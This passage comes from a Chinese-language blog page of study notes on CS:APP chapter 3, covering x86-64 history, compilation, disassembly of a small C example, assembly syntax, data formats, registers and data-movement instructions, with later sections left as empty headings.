<li><strong>Pentium III</strong>（1999年，8.2M个晶体管）。引入了SSE，这是一类处理整数或浮点数向量的指令。每个数据可以是1、2或4个字节，打包成128位的向量。由于芯片上包括了 二级高速缓存，这种芯片后来的版本最多使用了24M个晶体管。</li>
<li><strong>Pentium 4</strong> （2000年，42M个晶体管）。SSE扩展到了SSE2，增加了新的数据类型（包括双精度浮点数），以及针对这些格式的144条新指令。有了这些扩展，编译器可以使用SSE指令(而不是x87指令)，来编译浮点代码。</li>
<li><strong>Pentium 4E</strong>（2004年，125M个晶体管）。增加了<strong>超线程</strong>（hyperthreading），这种技术可以在一个处理器上同时运行两个程序；还增加了EM64T，它是Intel对AMD（Advanced Micro Devices）提出的对IA32的64位扩展的实现，我们称之为x86-64。</li>
<li><strong>Core 2</strong>（2006年，291M个晶体管）。回归到类似于P6的微体系结构。Intel的第一个多核微处理器，即多处理器实现在一个芯片上。但不支持超线程。</li>
<li><strong>Core i7</strong>，Nehalem（2008 年，781M个晶体管）。既支持超线程，也有多核，最初的版本支持每个核上执行两个程序，每个芯片上最多四个核。</li>
<li><strong>Core i7</strong>，SandyBridge（2011年，1.17G个晶体管）。引入了 AVX，这是对SSE的扩展，支持把数据封装进256位的向量。</li>
<li><strong>Core i7</strong>，Haswell（2013年，1.4G个晶体管）。将AVX扩展至AVX2，增加了更多的指令和指令格式。</li>
</ul>
<p>每个后继处理器的设计都是后向兼容的——较早版本上编译的代码可以在较新的处理器上运行。正如我们看到的那样，为了保持这种进化传统，指令集中有许多非常奇怪的东西。Intel处理器系列有好几个名字，包括 IA32，也就是“Intel 32位体系结构（Intel Architecture 32-bit)”，以及最新的Intel64，即IA32 的64位扩展，我们也称为x86-64。最常用的名字是“x86”，我们用它指代整个系列，也反映了直到i486处理器命名的惯例。</p>
</li>
<li><p><strong>摩尔定律（Moore’s Law）</strong>：1965年，Gordon Moore，Inter公司的创始人，根据当时的芯片技术做出推断，预测在未来十年，芯片上的晶体管数量每年会翻一番。</p>
<p>正如事实证明的那样，在超过50年中，半导体工业一直能够使得晶体管数目每18个月翻一倍。<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E6%91%A9%E5%B0%94%E5%AE%9A%E5%BE%8B.png" alt="摩尔定律"></p>
<p>对于计算机技术的其他方面，也有类似的呈指数增长的情况出现，比如磁盘和半导体存储器的存储容量。这些惊人的增长速度一直是计算机革命的主要驱动力。</p>
</li>
</ol>
<h2 id="3-2-Program-Encodings"><a href="#3-2-Program-Encodings" class="headerlink" title="3.2 Program Encodings"></a>3.2 Program Encodings</h2><p>程序编码。</p>
<ol>
<li><p>假设一个C程序有两个文件<code>p1.c</code>和<code>p2.c</code>，可以用Unix命令行编译这些代码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">linux&gt;</span><span class="bash"> gcc -Og -o p p1.c p2.c</span></span><br></pre></td></tr></table></figure>
<p>命令<code>gcc</code>指的就是GCC C编译器（默认，也可以用<code>cc</code>来启动），<code>-Og</code>是生成机器代码的优化等级（使用较高级别优化产生的代码会严重变形，难以理解），实际中，从得到的程序的性能考虑，较高级别的优化（<code>-O1</code>或<code>-O2</code>）被认为是较好的选择。</p>
</li>
<li><p>从源代码到可执行代码，经历了四个阶段：</p>
<ul>
<li>预处理器（插入头文件、扩展宏），</li>
<li>编译器（产生<code>.s</code>汇编代码文件），</li>
<li>汇编器（将汇编代码转化成<code>.o</code>二进制目标代码文件（机器代码的一种形式，包含所有指令的二进制表示，未填入全局值的地址）），</li>
<li>链接器（将目标代码与实现库函数的代码合并，产生最终的可执行代码文件（由<code>-o p</code>指定））。</li>
</ul>
</li>
</ol>
<h3 id="3-2-1-Machine-Level-Code"><a href="#3-2-1-Machine-Level-Code" class="headerlink" title="3.2.1 Machine-Level Code"></a>3.2.1 Machine-Level Code</h3><p>机器级代码。</p>
<ol>
<li><p>计算机系统使用了多种不同形式的抽象，利用更简单的抽象模型来隐藏实现的细节。机器级编程的两种抽象：</p>
<ul>
<li><p>由<strong>指令集体系架构（指令集架构，Instruction Set Architecture，ISA）</strong>来定义机器级程序的格式和行为，它定义了处理器状态、指令的格式，以及每条指令对状态的影响。</p>
<p>大多数ISA，包括x86-64，将程序的行为描述成顺序执行每条指令，实际上是并发地执行许多指令，但可以采取措施保证整体行为与ISA指定的顺序执行的行为完全一致。</p>
</li>
<li><p>机器级程序使用的内存地址是<strong>虚拟地址</strong>，提供的内存模型看上去是一个非常大的字节数组。</p>
<p>存储器系统的实际实现是将多个硬件存储器和操作系统软件组合起来。</p>
</li>
</ul>
</li>
<li><p>x86-64的机器代码和原始的C代码差别非常大，一些通常隐藏的处理器状态都是可见的：</p>
<ul>
<li><p><strong>程序计数器</strong>通常称为“PC”，在x86-64中用<code>%rip</code>表示，它给出将要执行的下一条指令在内存中的地址。</p>
</li>
<li><p><strong>整数寄存器文件</strong>包含16个命名的位置，分别存储64位的值，可以是地址（指针），也可以是整数数据。</p>
<p>有的寄存器被用来记录某些重要的程序状态，而其他的寄存器用来保存临时数据，例如过程的参数和局部变量，以及函数的返回值。</p>
</li>
<li><p><strong>条件码寄存器</strong>保存着最近执行的算术或逻辑指令的状态信息，用来实现控制或数据流中的条件变化，如实现<code>if</code>和<code>while</code>语句。</p>
</li>
<li><p>一组<strong>向量寄存器</strong>可以存放一个或多个整数或浮点数值。</p>
</li>
</ul>
</li>
<li><p>虽然C语言提供了一种模型，可以在内存中声明和分配各种数据类型的<strong>对象</strong>，但是机器代码只是简单地将内存看成一个很大的、按字节寻址的<strong>数组</strong>。</p>
</li>
<li><p>C语言中的聚合数据类型，例如数组和结构，在机器代码中用<strong>一组连续的字节</strong>来表示。即使是对标量数据类型，汇编代码也<strong>不区分</strong>有符号或无符号整数，<strong>不区分</strong>各种类型的指针，甚至于<strong>不区分</strong>指针和整数。</p>
</li>
<li><p>程序内存包含：</p>
<ul>
<li>程序的可执行机器代码</li>
<li>操作系统需要的一些信息</li>
<li>用来管理过程调用和返回的运行时栈</li>
<li>用户分配的内存块（比如用<code>malloc</code>库函数分配的）。</li>
</ul>
<p>程序内存用虚拟地址来寻址，在任意给定的时刻，只有有限一部分虚拟地址是合法的。操作系统负责管理虚拟地址空间，将虚拟地址翻译成实际处理器内存中的物理地址。</p>
</li>
<li><p>一条机器指令只执行一个非常基本的操作。</p>
</li>
<li><p>编译器产生机器指令的序列，才能实现程序结构，如算术表达式求值、循环或过程调用和返回。</p>
</li>
<li><p>支持GCC的开源社区一直在修改代码产生器，以产生更有效的代码。</p>
</li>
</ol>
<h3 id="3-2-2-Code-Examples"><a href="#3-2-2-Code-Examples" class="headerlink" title="3.2.2 Code Examples"></a>3.2.2 Code Examples</h3><p>代码示例。</p>
<ol>
<li><p>示例源文件为<code>mstore.c</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">mult2</span><span class="params">(<span class="keyword">long</span>, <span class="keyword">long</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">multstore</span><span class="params">(<span class="keyword">long</span> x, <span class="keyword">long</span> y, <span class="keyword">long</span> *dest)</span></span>&#123;</span><br><span class="line">	<span class="keyword">long</span> t = mult2(x, y);</span><br><span class="line">	*dest = t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用<code>-S</code>编译：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">linux&gt;</span><span class="bash"> gcc -Og -S mstore.c</span></span><br></pre></td></tr></table></figure>
<p>产生汇编文件<code>mstore.s</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">multstore:</span><br><span class="line">  pushq 	%rbx</span><br><span class="line">  movq 		%rdx, %rbx</span><br><span class="line">  call 		mult2</span><br><span class="line">  movq 		%rax, (%rbx) </span><br><span class="line">  popq 		%rbx</span><br><span class="line">  ret</span><br></pre></td></tr></table></figure>
<p>每行对应一条机器指令，除去了所有关于局部变量名或数据类型的信息。</p>
<p>若使用<code>-c</code>编译并汇编：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">linux&gt;</span><span class="bash"> gcc -Og -c mstore.c</span></span><br></pre></td></tr></table></figure>
<p>产生1 368字节目标代码文件<code>mstore.o</code>，是二进制的，无法直接查看。其中有一段14字节的序列，十六进制表示为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">53 48 89 d3 e8 00 00 00 00 48 89 03 5b c3</span><br></pre></td></tr></table></figure>
<p>这就是汇编指令对应的目标代码。这也印证了机器执行的程序只是一个字节序列，是对一系列指令的编码。机器产生这些指令的源代码几乎一无所知。</p>
</li>
<li><p>上面是如何得到的程序的字节表示？在用反汇编器确定其长度是14字节后，可以利用GNU调试工具GDB：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) x/14xb multstore</span><br></pre></td></tr></table></figure>
<p>即显示（<code>x</code>）从函数<code>multstore</code>处开始的14个十六进制格式表示（<code>x</code>）的字节（<code>b</code>）。</p>
</li>
<li><p><strong>反汇编器（disassembler）</strong>可以查看机器代码文件，根据机器代码产生类似汇编代码的格式。Linux中objdump（object dump）的<code>-d</code>可以充当这个角色：</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">linux&gt;</span><span class="bash"> objdump -d mstore.o</span></span><br></pre></td></tr></table></figure>
<p>得到结果如下（增加了注解）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Disassembly of fuction multstore in binary file mstore.o</span><br><span class="line">0000000000000000 &lt;multstore&gt;:</span><br><span class="line">Offset 	Bytes 					Equivalent assembly language</span><br><span class="line">0: 			53							push 	%rbx</span><br><span class="line">1:			48 89 d3				mov 	%rdx,%rbx</span><br><span class="line">4:			e8 00 00 00 00 	callq 9 &lt;multstore+0x9&gt;</span><br><span class="line">9:			48 89 03 				mov 	%rax,(%rbx)</span><br><span class="line">c:			5b 							pop 	%rbx</span><br><span class="line">d: 			c3							retq</span><br></pre></td></tr></table></figure>
<p>左侧将14个字节分成了6组，每组有1～5个字节，成为一条指令，右侧是等价的汇编语言。</p>
</li>
<li><p>一些关于机器代码和它的反汇编表示的特性值得注意：</p>
<ul>
<li><p>x86-64的指令长度从1到15个字节不等。</p>
<p>常用的指令以及操作数较少的指令所需的字节数少，而那些不太常用或操作数较多的指令所需字节数较多。</p>
</li>
<li><p>机器指令的设计方式是，从某个给定位置开始，可以将字节唯一地解码成机器指令。</p>
<p>例如，只有指令<code>pushq    %rbx</code>是以字节值<code>53</code>开头的。</p>
</li>
<li><p>反汇编器只是基于<strong>机器代码文件</strong>中的字节序列来确定汇编代码，<strong>不需要</strong>访问该程序的源代码或汇编代码。</p>
</li>
<li><p>反汇编器使用的指令命名规则与GCC生成的汇编代码使用的有些细微的差别。</p>
<p>GCC生成的指令省略了结尾的<code>q</code>（大小指示符，大多数情况中可以省略），而反汇编器未省略。</p>
</li>
</ul>
</li>
<li><p>上面的代码并不是实际可执行的代码，需要对一组有<code>main</code>函数的目标代码文件运行链接器，假设为<code>main.c</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">multstore</span><span class="params">(<span class="keyword">long</span>, <span class="keyword">long</span>, <span class="keyword">long</span> *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">long</span> d;</span><br><span class="line">  multstore(<span class="number">2</span>, <span class="number">3</span>, &amp;d);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;2 * 3 —&gt; %ld\n&quot;</span>, d);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">mult2</span><span class="params">(<span class="keyword">long</span> a, <span class="keyword">long</span> b)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">long</span> s = a * b;</span><br><span class="line">  <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>生成可执行文件<code>prog</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">linux&gt;</span><span class="bash"> gcc -Og -o prog main.c mstore.c</span></span><br></pre></td></tr></table></figure>
<p>得到8 655字节文件<code>prog</code>，包含了两个过程的代码、用来启动和终止程序的代码、以及用来与操作系统交互的代码。</p>
<p>反汇编<code>prog</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">linux&gt;</span><span class="bash"> objdump -d prog</span></span><br></pre></td></tr></table></figure>
<p>反汇编器会抽取出各种代码序列，包括：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Disassembly of function sum multstore binary file prog</span><br><span class="line">0000000000400540 &lt;multstore&gt;</span><br><span class="line">400540: 53							push %rbx</span><br><span class="line">400541: 48 89 d3				move %rdx,%rbx</span><br><span class="line">400544: e8 42 00 00 00	callq 40058b &lt;mult2&gt;</span><br><span class="line">400549: 48 89 03				mov %rax,(%rbx)</span><br><span class="line">40054c: 5b							pop %rbx</span><br><span class="line">40054d: c3							retq</span><br><span class="line">40054e: 90							nop</span><br><span class="line">40054f: 90							nop</span><br></pre></td></tr></table></figure>
<p>这段代码的特别之处是：</p>
<ul>
<li><p>左侧地址不同；</p>
</li>
<li><p>第5行调用函数处也添加了地址；</p>
<p>（因为链接器的任务之一就是为函数调用找到匹配的函数的可执行代码的位置）</p>
</li>
<li><p>多了第9行和第10行两行代码。</p>
<p>（这两行代码位于返回指令之后，对程序没有影响。只是为了使代码变为16字节，使得就存储器性能而言，能更好地放置下一个代码块）</p>
</li>
</ul>
</li>
</ol>
<h3 id="3-2-3-Notes-on-Formatting"><a href="#3-2-3-Notes-on-Formatting" class="headerlink" title="3.2.3 Notes on Formatting"></a>3.2.3 Notes on Formatting</h3><p>关于格式的注解。</p>
<ol>
<li><p>GCC产生的汇编代码有些难读，它包含了我们不需要关心的信息，而且不提供任何程序的描述。</p>
<p>用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">linux&gt;</span><span class="bash"> gcc -Og -S mstore.c</span></span><br></pre></td></tr></table></figure>
<p>生成汇编文件，得到<code>mstore.s</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	.file 	&quot;010-mstore.c&quot;</span><br><span class="line">	.text</span><br><span class="line">	.globl 	multstore</span><br><span class="line">	.type 	multstore, @function</span><br><span class="line">multstore:</span><br><span class="line">	pushq 	%rbx</span><br><span class="line">	movq 		%rdx, %rbx</span><br><span class="line">	call 		mult2</span><br><span class="line">	movq 		%rax, (%rbx)</span><br><span class="line">	popq 		%rbx</span><br><span class="line">	ret</span><br><span class="line">	.size 	multstore, .-multstore</span><br><span class="line">	.ident 	&quot;GCC:(Ubuntu4.8.l-2ubuntul-12.04) 4.8.1&quot;</span><br><span class="line">	.section 				.note.GNU-stack,&quot; &quot;,@progbits</span><br></pre></td></tr></table></figure>
<p>所有以<code>.</code>开头的都是指导汇编器和链接器工作的伪指令，可以忽略。</p>
</li>
<li><p>对于一些应用程序，程序员必须用汇编代码来访问机器的低级特性：</p>
<ul>
<li>可以用汇编代码编写整个函数，在链接阶段把它们和C函数组合起来；</li>
<li>也可以利用GCC的支持，直接在C程序中嵌入汇编代码。</li>
</ul>
</li>
<li><p>我们的表述是<strong>ATT</strong>（根据“AT&amp;T”命名，是运营贝尔实验室多年的公司）<strong>格式</strong>的汇编代码，是GCC、OBJDUMP和其他一些我们使用的工具的默认格式。</p>
<p>其他一些编程工具，包括Microsoft的工具，以及来自Inter的文档，其汇编代码都是<strong>Inter格式</strong>的。</p>
<p>利用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">linux&gt;</span><span class="bash"> gcc -Og -S -masm=inter mstore.c</span></span><br></pre></td></tr></table></figure>
<p>得到下列汇编代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">multstore: </span><br><span class="line">	push 	rbx</span><br><span class="line">	mov 	rbx, rdx </span><br><span class="line">	call 	mult2</span><br><span class="line">	mov 	QWORD PTR [rbx], rax</span><br><span class="line">	pop 	rbx</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>
<p>这就是Inter格式，与ATT格式的不同之处是：</p>
<ul>
<li>省略了后缀；</li>
<li>省略了<code>%</code> ；</li>
<li>用不同方式描述内存中的位置，是<code>QWORD PTR [rbx]</code>而不是<code>(%rbx)</code>；</li>
<li>操作数的顺序相反。</li>
</ul>
</li>
<li><p>虽然C编译器在把程序中表达的计算转换到机器代码方面表现出色，但是仍然有一些机器特性是C程序访问不到的。</p>
<p>例如，每次x86-64处理器执行算术或逻辑运算时，如果得到的运算结果的低8位中有偶数个1，那么就会把一个名为<code>PF</code>的1位条件码 （condition code）标志设置为1，否则就设置为0。</p>
<p>这里的<code>PF</code>表示“parity flag（奇偶标志）”。在C语言中计算这个信息需要至少7次移位、掩码和异或运算。即使作为每次算术或逻辑运算的一部分，硬件都完成了这项计算，而C程序却无法知道<code>PF</code>条件码标志的值。</p>
<p>在程序中插入几条汇编代码指令就能很容易地完成这项任务。</p>
<p>在C程序中插入汇编代码有两种方法：</p>
<ul>
<li>第一种是，我们可以编写完整的函数，放进一个独立的汇编代码文件中，让汇编器和链接器把它和用C语言书写的代码合并起来；</li>
<li>第二种方法是，我们可以使用GCC的内联汇编（inlineassembly）特性，用asm伪指令可以在C程序中包含简短的汇编代码。这种方法的好处是减少了与机器相关的代码量。</li>
</ul>
</li>
</ol>
<h2 id="3-3-Data-Formats"><a href="#3-3-Data-Formats" class="headerlink" title="3.3 Data Formats"></a>3.3 Data Formats</h2><p>数据格式。</p>
<ol>
<li><p>Inter用“字（word）”表示16位数据类型，称32位数为“双字（double words）”，称64位数为“四字（quad words）”。</p>
</li>
<li><p>C语言数据类型在x86-64中的大小：<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/C%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8Bx86-64.png" alt="C数据类型x86-64"></p>
<ul>
<li><p>标准<code>int</code>值存储为双字（32位）；</p>
</li>
<li><p>指针（用<code>char*</code>表示）存储为8字节（64位）的四字；</p>
</li>
<li><p><code>long</code>实现为64位，允许表示的值范围较大。x86-64指令集同样包括完整的针对字节、字和双字的指令；</p>
</li>
<li><p><code>float</code>为4字节的双字、<code>double</code>为8字节的四字；</p>
<p>（<code>long double</code>为80位、10字节，但不能移植到非x86机器上，较低效，不建议使用）</p>
</li>
</ul>
</li>
<li><p>GCC生成汇编代码指令的后缀表明了操作数的大小：<code>l</code>表示双字（32位数被看成是“长字（long word）”），也可以表示4字节<code>int</code>和8字节<code>double</code>，这不会产生歧义，因为浮点数使用的是一组完全不同的指令和寄存器。</p>
</li>
</ol>
<h2 id="3-4-Accessing-Information"><a href="#3-4-Accessing-Information" class="headerlink" title="3.4 Accessing Information"></a>3.4 Accessing Information</h2><p>访问信息。</p>
<ol>
<li>一个x86-64的中央处理单元（CPU）包含一组16个存储64位值的<strong>通用目的寄存器</strong>，用来存储<strong>整数数据</strong>和<strong>地址（指针）</strong>：<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%AF%84%E5%AD%98%E5%99%A8.png" alt="寄存器"><ul>
<li>最初的8086中有8个16位的寄存器，即<code>%ax</code>到<code>%bp</code>，<strong>每个寄存器都有特殊的用途</strong>，它们的名字就反映了这些不同的用途；</li>
<li>扩展到IA32架构时，这些寄存器也扩展成32位，标号从<code>%eax</code>到<code>%ebp</code>；</li>
<li>扩展到x86-64后，原来的8个寄存器扩展成64位，标号从<code>%rax</code>到<code>%rbp</code>，此外还增加了8个新的寄存器，标号从<code>%r8</code>到<code>%r15</code>。</li>
</ul>
</li>
<li>生成1字节和2字节数字的指令会保持剩下的字节不变；生成4字节数字的指令会把高位4个字节置为0（从IA32到x86-64的扩展）。</li>
<li>不同的寄存器扮演不同的角色：<ul>
<li>栈指针<code>%rsp</code>用来指明运行时栈的结束位置，有些程序会明确地读写这个寄存器；</li>
<li>另外15个寄存器的用法更灵活；</li>
<li>少量指令会使用某些特定的寄存器；</li>
<li>有一组标准的编程规范控制着如何使用寄存器来管理栈、传递函数参数、从函数的返回值，以及存储局部和临时数据。</li>
</ul>
</li>
</ol>
<h3 id="3-4-1-Operand-Specifiers"><a href="#3-4-1-Operand-Specifiers" class="headerlink" title="3.4.1 Operand Specifiers"></a>3.4.1 Operand Specifiers</h3><p>操作数指示符。</p>
<ol>
<li><p>大多数指令有一个或多个<strong>操作数（operand）</strong>，指示出执行一个操作要使用的<strong>源数据值</strong>，以及放置结果的<strong>目的位置</strong>：</p>
</li>
<li><p>源数据值可以以常数形式给出，或是从寄存器或内存读出，结果可以存放在寄存器或内存中。</p>
</li>
<li><p>操作数分为三种类型：</p>
<ul>
<li><p><strong>立即数（immediate）</strong>：用来表示常数值。</p>
<p>ATT格式中的书写方式是<code>$</code>后加一整数。不同指令允许的立即数值范围不同，汇编器会自动选择最紧凑的方式进行数值编码。</p>
</li>
<li><p><strong>寄存器（register）</strong>：表示某个寄存器的内容。</p>
<p>低位1、2、4或8字节都可以作为操作数，分别对应8、16、32或64位。下图中用$r_{a}$表示任意寄存器$a$，用$R[r_{a}]$来表示它的值，即将寄存器集合看成一个数组$R$，用寄存器标识符作为索引。</p>
</li>
<li><p><strong>内存引用</strong>：根据计算出来的地址（有效地址）访问某个内存位置。</p>
<p>将内存看成一个很大的字节数组，用$M_{b}[Addr]$表示对存储在内存中从地址$Addr$开始的$b$个字节值的引用。</p>
</li>
</ul>
</li>
<li><p>x86-64支持的操作数格式（比例因子<code>s</code>必须是1、2、4或者8）：<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%BC%E5%BC%8F.png" alt="操作数格式"></p>
</li>
<li><p>上图可以看出多种不同的寻址模式，允许不同形式的内存引用。最后的通用形式中，基址寄存器和变址寄存器必须是64位的。</p>
</li>
</ol>
<h3 id="3-4-2-Data-Movement-Instructions"><a href="#3-4-2-Data-Movement-Instructions" class="headerlink" title="3.4.2 Data Movement Instructions"></a>3.4.2 Data Movement Instructions</h3><p>数据传送指令。</p>
<ol>
<li><p>MOV类：把数据从源位置复制到目的位置，不做任何变化。包括<code>movb</code>、<code>movw</code>、<code>movl</code>和<code>movq</code>，操作的数据大小分别是1、2、4和8字节。第一个是源操作数，第二个是目的操作数。</p>
</li>
<li><p>源操作数可以是立即数、寄存器或内存，但目的操作数只能是寄存器或内存。x86-64又加了一条限制：传送指令的两个操作数不能同时为内存。</p>
</li>
<li><p>大多数情况下，MOV指令只会更新目的操作数指定的寄存器字节或内存位置，例外是<code>movl</code>指令，它会把目的寄存器的高位4字节设置为0。原因是x86-64采用的惯例，即任何寄存器生成32位值的指令都会把该寄存器的高位部分置成0。</p>
</li>
<li><p>常规的<code>movq</code>只能以表示为32位补码数字的立即数作为源操作数，然后把这个值利用符号位扩展得到64位的值，放到目的位置。而<code>movabsq</code>可以以任意64位立即数作为源操作数，且只能以寄存器作为目的。</p>
</li>
<li><p>在将较小的源值复制到较大的目的时使用另外两类数据传送指令：</p>
<ul>
<li>MOVZ类：把数据从源（寄存器或内存中）复制到目的寄存器，把目的中剩余的字节填充为0（零扩展）；</li>
<li>MOVS类：和MOVZ类似，只不过通过符号位扩展来填充。</li>
</ul>
<p>指令的最后两个字符均为大小指示符，第一个是源的大小，第二个是目的的大小（目的大于源）。</p>
<p>包括<code>movzbw</code>、<code>movzbl</code>、<code>movzwl</code>、<code>movzbq</code>、<code>movzwq</code>和<code>movsbw</code>、<code>movsbl</code>、<code>movswl</code>、<code>movsbq</code>、<code>movswq</code>，还有<code>movslq</code>、<code>cltq</code>（<code>cltq</code>只作用于<code>%eax</code>和<code>%rax</code>，没有操作数，作用是把<code>%eax</code>（源）符号扩展到<code>%rax</code>（目的））。</p>
<p>注意没有“<code>movzlq</code>”这样的指令。</p>
</li>
</ol>
<h3 id="3-4-3-Data-Movement-Example"><a href="#3-4-3-Data-Movement-Example" class="headerlink" title="3.4.3 Data Movement Example"></a>3.4.3 Data Movement Example</h3><p>数据传送示例。</p>
<ol>
<li>指针就是地址，间接引用指针（<code>*p</code>）就是在内存中使用存放该指针的寄存器。</li>
<li>局部变量保存在寄存器中，而不是内存中。访问寄存器比访问内存要快得多。</li>
</ol>
<h3 id="3-4-4-Pushing-and-Popping-Stack-Data"><a href="#3-4-4-Pushing-and-Popping-Stack-Data" class="headerlink" title="3.4.4 Pushing and Popping Stack Data"></a>3.4.4 Pushing and Popping Stack Data</h3><p>压入和弹出栈操作（属于数据传送操作）。</p>
<ol>
<li>栈遵循LIFO原则，可以实现为一个数组，总是从数组的一端插入和删除元素，这一端被称为<strong>栈顶</strong>。</li>
<li>如下图所示，栈向下（低地址）增长，即<strong>栈顶</strong>元素的地址是所有栈中元素地址中<strong>最低</strong>的（栈顶位于图的底部）：<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E6%A0%88.png" alt="栈"></li>
<li>栈指针<code>%rsp</code>保存着栈顶元素的地址（始终指向栈顶）。</li>
<li>下图是入栈和出栈指令（只有一个操作数）：<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%85%A5%E6%A0%88%E5%92%8C%E5%87%BA%E6%A0%88.png" alt="入栈和出栈"><ul>
<li>将一个四字压入栈中，先将栈指针减8，然后将值写到新的栈顶地址；</li>
<li>弹出一个四字，先从栈顶位置读出数据，然后将栈指针加8。被弹出的栈顶元素仍保留在对应的内存位置中，直到被覆盖。</li>
</ul>
</li>
<li>可以用标准的内存寻址方法访问栈内的任意位置。</li>
</ol>
<h2 id="3-5-Arithmetic-and-Logical-Operations"><a href="#3-5-Arithmetic-and-Logical-Operations" class="headerlink" title="3.5 Arithmetic and Logical Operations"></a>3.5 Arithmetic and Logical Operations</h2><p>算术和逻辑操作。</p>
<ol>
<li>下图是一些整数和逻辑操作。除<code>leaq</code>外，各为一类，如ADD类有<code>addb</code>、<code>addw</code>、<code>addl</code>和<code>addq</code>，分别是字节加法、字加法、双字加法和四字加法。某些类又被归为一组，分别为加载有效地址、一元操作、二元操作和移位。</li>
</ol>
<h3 id="3-5-1-Load-Effective-Address"><a href="#3-5-1-Load-Effective-Address" class="headerlink" title="3.5.1 Load Effective Address"></a>3.5.1 Load Effective Address</h3><h3 id="3-5-2-Unary-and-Binary-Operations"><a href="#3-5-2-Unary-and-Binary-Operations" class="headerlink" title="3.5.2 Unary and Binary Operations"></a>3.5.2 Unary and Binary Operations</h3><h3 id="3-5-3-Shift-Operations"><a href="#3-5-3-Shift-Operations" class="headerlink" title="3.5.3 Shift Operations"></a>3.5.3 Shift Operations</h3><h3 id="3-5-4-Discussion"><a href="#3-5-4-Discussion" class="headerlink" title="3.5.4 Discussion"></a>3.5.4 Discussion</h3><h3 id="3-5-5-Special-Arithmetic-Operations"><a href="#3-5-5-Special-Arithmetic-Operations" class="headerlink" title="3.5.5 Special Arithmetic Operations"></a>3.5.5 Special Arithmetic Operations</h3><h2 id="3-6-Control"><a href="#3-6-Control" class="headerlink" title="3.6 Control"></a>3.6 Control</h2><h3 id="3-6-1-Condition-Codes"><a href="#3-6-1-Condition-Codes" class="headerlink" title="3.6.1 Condition Codes"></a>3.6.1 Condition Codes</h3><h3 id="3-6-2-Accessing-the-Condition-Codes"><a href="#3-6-2-Accessing-the-Condition-Codes" class="headerlink" title="3.6.2 Accessing the Condition Codes"></a>3.6.2 Accessing the Condition Codes</h3><h3 id="3-6-3-Jump-Instructions"><a href="#3-6-3-Jump-Instructions" class="headerlink" title="3.6.3 Jump Instructions"></a>3.6.3 Jump Instructions</h3><h3 id="3-6-4-Jump-Instruction-Encodings"><a href="#3-6-4-Jump-Instruction-Encodings" class="headerlink" title="3.6.4 Jump Instruction Encodings"></a>3.6.4 Jump Instruction Encodings</h3><h3 id="3-6-5-Implementing-Conditional-Branches-with-Conditional-Control"><a href="#3-6-5-Implementing-Conditional-Branches-with-Conditional-Control" class="headerlink" title="3.6.5 Implementing Conditional Branches with Conditional Control"></a>3.6.5 Implementing Conditional Branches with Conditional Control</h3><h3 id="3-6-6-Implementing-Conditional-Branches-with-Conditional-Moves"><a href="#3-6-6-Implementing-Conditional-Branches-with-Conditional-Moves" class="headerlink" title="3.6.6 Implementing Conditional Branches with Conditional Moves"></a>3.6.6 Implementing Conditional Branches with Conditional Moves</h3><h3 id="3-6-7-Loops"><a href="#3-6-7-Loops" class="headerlink" title="3.6.7 Loops"></a>3.6.7 Loops</h3><h3 id="3-6-8-Switch-Statements"><a href="#3-6-8-Switch-Statements" class="headerlink" title="3.6.8 Switch Statements"></a>3.6.8 Switch Statements</h3><h2 id="3-7-Procedures"><a href="#3-7-Procedures" class="headerlink" title="3.7 Procedures"></a>3.7 Procedures</h2><h3 id="3-7-1-The-Run-Time-Stack"><a href="#3-7-1-The-Run-Time-Stack" class="headerlink" title="3.7.1 The Run-Time Stack"></a>3.7.1 The Run-Time Stack</h3><h3 id="3-7-2-Control-Transfer"><a href="#3-7-2-Control-Transfer" class="headerlink" title="3.7.2 Control Transfer"></a>3.7.2 Control Transfer</h3><h3 id="3-7-3-Data-Transfer"><a href="#3-7-3-Data-Transfer" class="headerlink" title="3.7.3 Data Transfer"></a>3.7.3 Data Transfer</h3><h3 id="3-7-4-Local-Storage-on-the-Stack"><a 